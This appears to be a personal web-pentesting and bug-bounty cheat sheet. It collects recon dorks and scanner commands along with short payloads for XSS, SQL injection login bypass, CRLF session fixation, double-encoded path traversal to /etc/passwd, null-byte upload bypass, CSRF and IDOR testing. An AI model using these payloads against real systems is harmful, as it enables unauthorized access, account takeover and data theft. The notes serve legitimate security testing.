                  Logic and tokens
1-  try to login with two users and see tokens from  inspect -> application and compare them  
2-  you can login and copy token and logout and try to put token back see if you can access   
3-  try to forget password and send code then in the same session add any link to internal profile and see if you can access account data ex: /myaccount (don't reload)  ... you can verfiy if you got session id from >> inspect > applicatoin 
4- try to register as admin then you will get inavalible username >> in the same session go to /myaccount  (don't reload) 





google dorks : 
  
  site:target.com inurl:adminintitle:login 
  site:website.comintitle:/admin 
  site:website.cominurl:admin
  intitle:admin intext:admin
  index of / site: /etc/certs + "index of /" */* site:example.com
  
  administrator | debug | login | root | wp-login | master | superuser
  example.com/wp-content/uploads/2021/      >> wordpress 
  example.com/wp-inc/       >> for wp-db files
  
  allintext:username filetype:log     >> find log files 
  ext:sql intext:"-- phpMyAdmin SQL Dump"
  
  
  
  
  ----------------------------------------------------------------------------------------------
  https://app.pluralsight.com/course-player?clipId=fc4ed0ad-2778-4318-8b97-9f2010471064
                      BURPSUITE   
  extentions :: 
        1- co2 >> sqli
        2- retire.js >> jquery and javascript files
        3- carbonator   >> automate targeting , spidering , and scanning vulns
        install carbonator in burpsuite pro and run in termainal  ./burpsuite is location of the burp
java -jar -Xmx512M -Djava.awt.headless=true ./burpsuite_pro_v1.8.8.jar http exmple.com 80 / 
        
        
  file upload or download :: file.php%2500.pdf    >> this will ignore .pdf in server but pass filter
  
  
  
  ----------------------------------------------------------------------------------------------
                    JSON EXPLOIT
  
  inject json value of request with xss 
  {"description":"<script>alert(\"hossam\")"}
  try to change the method from get to put to inject database
  
  if json is only in respone take it and modify and then 
  PUT /file.txt           or you can use POST without any parameters in link
  content-type: application/json
  {"description":"<script>alert(\"hossam\");</script>"}

  
  


--------------------------------------------------------------------------------------------
                                    CSRF
  1- try to remove the token and see if the same response
  2- try to make poc by burpsuite and if there is current password try to remove it 
  3- 
  
 
 inrul:login;jsessionid=    >> to see squestoinal session id 
 
 
 
 
 ----------------------------------------------------------------------------------------------
            Combining Session Fixation With Http Request Splitting 
            
http://host/loging\r\nSet-Cookie: SESSIONID=12345\r\nDummy-Header:

Respone
HTTP /1.1 302 
Server: host
Locatoin: https://host/login Set-Cookie:SESSIONID=12345 Dummy-Header: /login


            Combining Session fixation with xss 
https://host/search?q=
document.cookie="SESSIONID=12345;%20path=/;
%20domain=.example.com";



----------------------------------------------------------------------------------------------
                                    BRUTE FORCE 
   
   try to login with invalid password 10 times and then go with valid password if your account was not locked the you can do brute force attack 
 
 
 
 
 
 ----------------------------------------------------------------------------------------------

 
1) go get -u http://github.com/lc/gau
2) echo "http://drive.google.com" | gau
3) Read all the secrets



----------------------------------------------------------------------------------------------
  
  Path traversal to LFI 

/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd

echo http://example.gov | waybackurls | grep /images/

# Double Encode Payload: "www.example.com/images/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"   >> in repeater
  
----------------------------------------------------------------------------------------------
nmap -sV -iL host.txt -oN nmap_scan.txt

Wait a few hours

cat nmap_scan.txt | grep open http://pic.example.com


----------------------------------------------------------------------------------------------
                        SQLI 
          
AAAA')/**/or/**/(select/**/1)=1%23

login 
  ' or 1=1 and email like ('%admin%'); -- 
  any password



----------------------------------------------------------------------------------------------
amass <<
    amass enum -ip -src -brute -df domains
    


---------------------------------------------------------
            (((XSS))
  <script>alert(\"hossam\")</script>        // add \ before " to escape filter





------------------------------------------------------------
IDOR :: 
  GO to my account and intercept data then change id 
  go to comments and intercept and change the id 
  go to my cart and intercept and change the id 


----------------------------------------------------------------------------------------------

Directory listing::
        try every dir in debuging folders 
              http://example.com/assets
              https://example.com/app
              http://example.com/en

  
  
  ----------------------------------------------------------------------------------------------
  httpx -l hosts.txt -paths /root/login.txt -threads 50 -random-agent -x GET, POST -tech-detect -status-code -follow-redirects -title -content-lengthhttpx -l hosts.txt -ports 80,443,8009,8080,8081,8090,8180,8443 -paths /root/login.txt -threads 50 -random-agent -x GET, POST -tech-detect -status-code -follow-redirects -title -content-length
----------------------------------------------------------------------------------------------




  shodan :: 
      ssl.cert.subject.cn:"website.com" http.title:"admin"
      ssl: "website.com" http.title: "admin"
      ssl.cert.subject.cn:"website.com" admin
      ssl: "website.com" admin
      
      
 Fofa :: 
      cert = "website.com" && title = "admin"
      cert.subject = "website.com" && title = "admin"
      cert = "website.com" && body = "admin"
      
 Censys:: 
       (services.tls.certificates.leaf_data.issuer.common_name: website.com) AND services.http.response.html_title: admin
       (services.tls.certificates.leaf_data.issuer.common_name: website.com) AND services.http.response.body: admin
       
       
       ---------------------------------------------------------------------------------------------------------
       
                                    NMAP
           
           nmap --script http-methods 192.168.1.1         >> to check the allowable methods 
           
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
